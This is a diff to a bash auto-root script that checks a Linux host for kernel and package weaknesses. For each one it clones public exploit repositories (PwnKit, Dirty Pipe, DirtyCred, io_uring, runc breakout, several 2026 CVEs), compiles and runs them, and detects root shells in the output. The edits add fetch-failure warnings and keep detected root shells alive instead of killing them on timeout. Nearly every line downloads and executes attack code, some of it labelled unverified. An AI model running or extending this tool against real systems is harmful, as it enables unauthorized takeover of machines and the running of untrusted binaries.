@@ -216,7 +216,7 @@ got_root() {
 }
 
 out_shows_root() {
-    grep -qiE "uid=0\(|euid=0\(|uid=0\b|euid=0\b|root@|you should be root|root shell|got root|#\s+$" "$1" 2>/dev/null
+    grep -qiE "uid=0\(|euid=0\(|uid=0\b|euid=0\b|root@|you should be root|root shell|got root|^#\s*$" "$1" 2>/dev/null
 }
 
 run() {
@@ -225,6 +225,7 @@ run() {
     echo "==== $name :: $cmd ====" >> $LOGFILE
     local OUT=$WRK/.out.$$
     local RCMD="$cmd; id 2>&1"
+    local TIMEOUT_KILLED=0
     if [ "$HAS_TIMEOUT" = "1" ] && command -v setsid >/dev/null 2>&1; then
         setsid bash -c "$RCMD" </dev/null >"$OUT" 2>&1 &
         local PID=$!
@@ -233,11 +234,19 @@ run() {
             sleep 1; S=$((S+1))
         done
         if kill -0 $PID 2>/dev/null; then
-            [ "$QUIET" = "0" ] && echo -e "${YELLOW}    [timeout] killing process group...${NC}"
-            kill -- -$PID 2>/dev/null
-            sleep 2
-            kill -9 -- -$PID 2>/dev/null
-            RC=124
+            if out_shows_root "$OUT"; then
+                [ "$QUIET" = "0" ] && echo -e "${YELLOW}    [root shell detected] not killing process group...${NC}"
+                sleep 1
+                wait $PID 2>/dev/null
+                RC=$?
+            else
+                [ "$QUIET" = "0" ] && echo -e "${YELLOW}    [timeout] killing process group...${NC}"
+                kill -- -$PID 2>/dev/null
+                sleep 2
+                kill -9 -- -$PID 2>/dev/null
+                RC=124
+                TIMEOUT_KILLED=1
+            fi
         else
             wait $PID 2>/dev/null
             RC=$?
@@ -254,10 +263,15 @@ run() {
     else
         cat "$OUT" >> $LOGFILE
     fi
-    if [ "$(id -u)" = "0" ] || out_shows_root "$OUT"; then
+    if [ "$(id -u)" = "0" ]; then
         rm -f "$OUT"
         echo "$name|OK|root" >> $SUM
         echo -e "${GREEN}[+] SUCCESS via: $name${NC}"
+        got_root "$name"
+    elif out_shows_root "$OUT"; then
+        rm -f "$OUT"
+        echo "$name|OK?|root-in-output" >> $SUM
+        echo -e "${GREEN}[+] ROOT via: $name (root reported in output)${NC}"
         got_root "$name"
     else
         rm -f "$OUT"
@@ -358,13 +372,13 @@ fi
 # --- PwnKit alt (Rvn0xsy) ---
 if [ "$HAS_GCC" = "1" ] && ( [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ] ); then
     note "pkexec found -> CVE-2021-4034 (alt POC)"
-    fetch_repo Rvn0xsy/CVE-2021-4034 rvn && run "cd rvn && gcc cve-2021-4034.c -o exp && ./exp" "PwnKit-alt"
+    fetch_repo Rvn0xsy/CVE-2021-4034 rvn && run "cd rvn && gcc cve-2021-4034.c -o exp && ./exp" "PwnKit-alt" || warn "failed to fetch Rvn0xsy/CVE-2021-4034"
 fi
 
 # --- Dirty Pipe (CVE-2022-0847) ---
 in_krange "5.8-5.16" || warn "Dirty Pipe: kernel out of range (5.8-5.16), trying anyway"
 if [ "$HAS_GCC" = "1" ]; then
-    fetch_repo Arinerron/CVE-2022-0847-DirtyPipe-Exploit dp && run "cd dp && gcc exploit.c -o exploit && ./exploit" "Dirty Pipe"
+    fetch_repo Arinerron/CVE-2022-0847-DirtyPipe-Exploit dp && run "cd dp && gcc exploit.c -o exploit && ./exploit" "Dirty Pipe" || warn "failed to fetch Arinerron/CVE-2022-0847-DirtyPipe-Exploit"
 fi
 
 # --- GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) ---
@@ -376,25 +390,25 @@ fi
 # --- DirtyCred ---
 in_krange "5.14-6.99" || warn "DirtyCred: kernel out of range (5.14-6.x), trying anyway"
 if [ "$HAS_GCC" = "1" ]; then
-    fetch_repo PR0fix/DirtyCred dc && run "cd dc && make && ./exploit" "DirtyCred"
+    fetch_repo PR0fix/DirtyCred dc && run "cd dc && make && ./exploit" "DirtyCred" || warn "failed to fetch PR0fix/DirtyCred"
 fi
 
 # --- DirtyFrag ---
 in_krange "6.1-6.6" || warn "DirtyFrag: kernel out of range (6.1-6.6), trying anyway"
 if [ "$HAS_GCC" = "1" ]; then
-    fetch_repo V4bel/dirtyfrag df && run "cd df && gcc -O0 -Wall -o exp exp.c -lutil && ./exp" "DirtyFrag"
+    fetch_repo V4bel/dirtyfrag df && run "cd df && gcc -O0 -Wall -o exp exp.c -lutil && ./exp" "DirtyFrag" || warn "failed to fetch V4bel/dirtyfrag"
 fi
 
 # --- FragNesia ---
 in_krange "5.19-6.8" || warn "FragNesia: kernel out of range (5.19-6.8), trying anyway"
 if [ "$HAS_GCC" = "1" ]; then
-    fetch_repo v12-security/pocs pocs && run "cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp" "FragNesia"
+    fetch_repo v12-security/pocs pocs && run "cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp" "FragNesia" || warn "failed to fetch v12-security/pocs"
 fi
 
 # --- eBPF Ring Buffer / Verifier LPE ---
 if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_BPF_SYSCALL && kcfg CONFIG_BPF && kcfg CONFIG_USER_NS; then
     note "eBPF enabled -> eBPF LPE"
-    fetch_repo argonsecurity/ebpf-lpe-poc ebpf && run "cd ebpf && make && ./exploit" "eBPF-LPE"
+    fetch_repo argonsecurity/ebpf-lpe-poc ebpf && run "cd ebpf && make && ./exploit" "eBPF-LPE" || warn "failed to fetch argonsecurity/ebpf-lpe-poc"
 else
     [ "$HAS_GCC" = "0" ] && warn "skip eBPF (no gcc)" || warn "skip eBPF (BPF/user-ns disabled)"
 fi
@@ -402,7 +416,7 @@ fi
 # --- Netfilter / nf_tables (CVE-2023-32233) ---
 if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_NF_TABLES; then
     note "nftables enabled -> CVE-2023-32233"
-    fetch_repo bluefrostsecurity/CVE-2023-32233-PoC nft && run "cd nft && gcc -O2 exploit.c -o exploit -lnftables && ./exploit" "nftables-32233"
+    fetch_repo bluefrostsecurity/CVE-2023-32233-PoC nft && run "cd nft && gcc -O2 exploit.c -o exploit -lnftables && ./exploit" "nftables-32233" || warn "failed to fetch bluefrostsecurity/CVE-2023-32233-PoC"
 else
     [ "$HAS_GCC" = "0" ] && warn "skip nftables (no gcc)" || warn "skip nftables (CONFIG_NF_TABLES disabled)"
 fi
@@ -410,13 +424,13 @@ fi
 # --- SLUB Overflow (CVE-2022-29582) ---
 in_krange "5.10-5.17" || warn "SLUB: kernel out of range (5.10-5.17), trying anyway"
 if [ "$HAS_GCC" = "1" ]; then
-    fetch_repo Bonfee/CVE-2022-29582 slub && run "cd slub && gcc -O2 exploit.c -o exploit && ./exploit" "SLUB-29582"
+    fetch_repo Bonfee/CVE-2022-29582 slub && run "cd slub && gcc -O2 exploit.c -o exploit && ./exploit" "SLUB-29582" || warn "failed to fetch Bonfee/CVE-2022-29582"
 fi
 
 # --- io_uring UAF ---
 if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_IO_URING; then
     note "io_uring enabled -> io_uring LPE"
-    fetch_repo kxcode/iouring-exploit-poc iou && run "cd iou && gcc -O2 exploit.c -o exploit -lpthread && ./exploit" "io_uring"
+    fetch_repo kxcode/iouring-exploit-poc iou && run "cd iou && gcc -O2 exploit.c -o exploit -lpthread && ./exploit" "io_uring" || warn "failed to fetch kxcode/iouring-exploit-poc"
 else
     [ "$HAS_GCC" = "0" ] && warn "skip io_uring (no gcc)" || warn "skip io_uring (CONFIG_IO_URING disabled)"
 fi
@@ -432,26 +446,26 @@ fi
 # --- CVE-2026-46215 ---
 [ "$KERNEL_MAJ" -ge 7 ] 2>/dev/null || warn "CVE-2026-46215: needs kernel >= 7, trying anyway"
 if [ "$HAS_GCC" = "1" ]; then
-    fetch_repo bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable c46215 && run "cd c46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit" "CVE-2026-46215"
+    fetch_repo bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable c46215 && run "cd c46215 && gcc -o exploit exploit.c -lpthread -lutil -static && ./exploit" "CVE-2026-46215" || warn "failed to fetch bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable"
 fi
 
 # --- PackageKit (CVE-2026-41651) ---
 if dpkg -l 2>/dev/null | grep -qi packagekit || rpm -qa 2>/dev/null | grep -qi PackageKit; then
     note "PackageKit installed -> CVE-2026-41651"
     glibc_ge 2.33 || warn "41651: glibc $GLIBC < 2.33 (binary needs GLIBC_2.33+), trying anyway"
-    fetch_repo Vozec/CVE-2026-41651 pk && run "cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651" "CVE-2026-41651"
+    fetch_repo Vozec/CVE-2026-41651 pk && run "cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651" "CVE-2026-41651" || warn "failed to fetch Vozec/CVE-2026-41651"
 fi
 
 # --- Polkit / DBus (CVE-2021-3560) ---
 if [ -f "/usr/bin/pkexec" ] || [ -f "/usr/bin/polkit-agent-helper-1" ]; then
     note "Polkit present -> CVE-2021-3560"
-    fetch_repo cybersecurityworks/CVE-2021-3560-Exploit-POC p3560 && run "cd p3560 && python3 cve-2021-3560.py" "CVE-2021-3560"
+    fetch_repo cybersecurityworks/CVE-2021-3560-Exploit-POC p3560 && run "cd p3560 && python3 cve-2021-3560.py" "CVE-2021-3560" || warn "failed to fetch cybersecurityworks/CVE-2021-3560-Exploit-POC"
 fi
 
 # --- runc Container Breakout (CVE-2024-21626) ---
 if [ -f /.dockerenv ] || grep -qE "docker|kubepods|lxc" /proc/1/cgroup 2>/dev/null; then
     note "container detected -> runc breakout (CVE-2024-21626)"
-    fetch_repo snyk/CVE-2024-21626-PoC runc && run "cd runc && bash exploit.sh" "runc-21626"
+    fetch_repo snyk/CVE-2024-21626-PoC runc && run "cd runc && bash exploit.sh" "runc-21626" || warn "failed to fetch snyk/CVE-2024-21626-PoC"
 else
     warn "skip runc breakout (not a container)"
 fi
@@ -459,7 +473,7 @@ fi
 # --- OVSwrap ---
 if lsmod 2>/dev/null | grep -q openvswitch || [ -d "/sys/module/openvswitch" ]; then
     note "Open vSwitch loaded -> OVSwrap"
-    fetch_repo manizada/OVSwrap ovs && run "cd ovs && python3 ovswrap-poc.py" "OVSwrap"
+    fetch_repo manizada/OVSwrap ovs && run "cd ovs && echo y | python3 ovswrap-poc.py" "OVSwrap" || warn "failed to fetch manizada/OVSwrap"
 fi
 
 # --- CVE-2026-31431 ---
@@ -470,30 +484,30 @@ fi
 
 # --- CVE-2026-46300 (hazir binary) ---
 warn "CVE-2026-46300: unverified binary, trying anyway"
-fetch_repo ExploitEoom/CVE-2026-46300 c46300 && run "cd c46300 && chmod +x exploit && ./exploit" "CVE-2026-46300"
+fetch_repo ExploitEoom/CVE-2026-46300 c46300 && run "cd c46300 && chmod +x exploit && ./exploit" "CVE-2026-46300" || warn "failed to fetch ExploitEoom/CVE-2026-46300"
 
 # --- CVE-2026-64600 ---
 if [ "$HAS_GCC" = "1" ]; then
     warn "CVE-2026-64600: unverified repo, trying anyway"
-    fetch_repo Debajyoti0-0/CVE-2026-64600 c64600 && run "cd c64600 && gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread && ./cve-2026-64600" "CVE-2026-64600"
+    fetch_repo Debajyoti0-0/CVE-2026-64600 c64600 && run "cd c64600 && gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread && ./cve-2026-64600" "CVE-2026-64600" || warn "failed to fetch Debajyoti0-0/CVE-2026-64600"
 fi
 
 # --- CVE-2026-68138 ---
 if [ "$HAS_GCC" = "1" ]; then
     warn "CVE-2026-68138: unverified repo, trying anyway"
-    fetch_repo aramosf/CVE-2026-68138 c68138 && run "cd c68138 && bash build.sh && ./build/exploit" "CVE-2026-68138"
+    fetch_repo aramosf/CVE-2026-68138 c68138 && run "cd c68138 && bash build.sh && ./build/exploit" "CVE-2026-68138" || warn "failed to fetch aramosf/CVE-2026-68138"
 fi
 
 # --- CVE-2026-68398 (gcc) ---
 if [ "$HAS_GCC" = "1" ]; then
     warn "CVE-2026-68398: expects 5.15.0-187-generic, current $KERNEL - trying anyway"
-    fetch_repo aramosf/cve-2026-68398 c68398 && run "cd c68398 && gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit" "CVE-2026-68398"
+    fetch_repo aramosf/cve-2026-68398 c68398 && run "cd c68398 && gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit" "CVE-2026-68398" || warn "failed to fetch aramosf/cve-2026-68398"
 fi
 
 # --- CVE-2026-68398 (make) ---
 if [ "$HAS_MAKE" = "1" ]; then
     warn "CVE-2026-68398-make: expects 5.15.0-187-generic, current $KERNEL - trying anyway"
-    fetch_repo aramosf/cve-2026-68398 c68398b && run "cd c68398b && make && ./build/CVE-2026-68398" "CVE-2026-68398-make"
+    fetch_repo aramosf/cve-2026-68398 c68398b && run "cd c68398b && make && ./build/CVE-2026-68398" "CVE-2026-68398-make" || warn "failed to fetch aramosf/cve-2026-68398"
 fi
 
 # --- copy.fail exp ---
@@ -516,6 +530,7 @@ if [ -s "$SUM" ]; then
     while IFS='|' read -r n rs rr; do
         case "$rs" in
             OK)   echo -e "  ${GREEN}[OK]${NC}   $n";;
+            OK?)  echo -e "  ${GREEN}[OK?]${NC}  $n (root in output — verify: su -c id)";;
             FAIL) echo -e "  ${RED}[FAIL]${NC} $n ($rr)";;
         esac
     done < "$SUM"
